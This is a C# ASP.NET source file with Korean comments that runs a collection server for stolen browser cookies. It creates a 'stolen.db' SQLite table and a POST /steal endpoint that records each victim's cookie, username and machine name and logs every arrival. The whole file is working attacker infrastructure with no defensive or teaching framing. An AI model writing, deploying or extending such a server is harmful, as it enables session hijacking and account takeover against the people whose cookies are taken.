using System.Net;
using System.Data.SQLite;
using System.IO;

var builder = WebApplication.CreateBuilder(args);
var app = builder.Build();

// DB 생성
string dbPath = "stolen.db";
if (!File.Exists(dbPath))
{
    SQLiteConnection.CreateFile(dbPath);
    using var conn = new SQLiteConnection($"Data Source={dbPath}");
    conn.Open();
    new SQLiteCommand("CREATE TABLE cookies(id INTEGER PRIMARY KEY, cookie TEXT, user TEXT, pc TEXT, time TEXT)", conn).ExecuteNonQuery();
}

// POST /steal 엔드포인트
app.MapPost("/steal", async (HttpContext ctx) =>
{
    using var reader = new StreamReader(ctx.Request.Body);
    string body = await reader.ReadToEndAsync();
    var parts = body.Split('&');
    string cookie = "", user = "", pc = "";

    foreach (var p in parts)
    {
        var kv = p.Split('=');
        if (kv.Length < 2) continue;
        if (kv[0] == "cookie") cookie = Uri.UnescapeDataString(kv[1]);
        if (kv[0] == "user") user = Uri.UnescapeDataString(kv[1]);
        if (kv[0] == "pc") pc = Uri.UnescapeDataString(kv[1]);
    }

    if (!string.IsNullOrEmpty(cookie))
    {
        using var conn = new SQLiteConnection($"Data Source={dbPath}");
        conn.Open();
        var cmd = new SQLiteCommand("INSERT INTO cookies(cookie, user, pc, time) VALUES (@c, @u, @p, @t)", conn);
        cmd.Parameters.AddWithValue("@c", cookie);
        cmd.Parameters.AddWithValue("@u", user);
        cmd.Parameters.AddWithValue("@p", pc);
        cmd.Parameters.AddWithValue("@t", DateTime.Now.ToString("s"));
        cmd.ExecuteNonQuery();
        Console.WriteLine($"[도착] {user}@{pc}");
    }

    return Results.Ok("OK");
});

app.Run("http://0.0.0.0:8080");
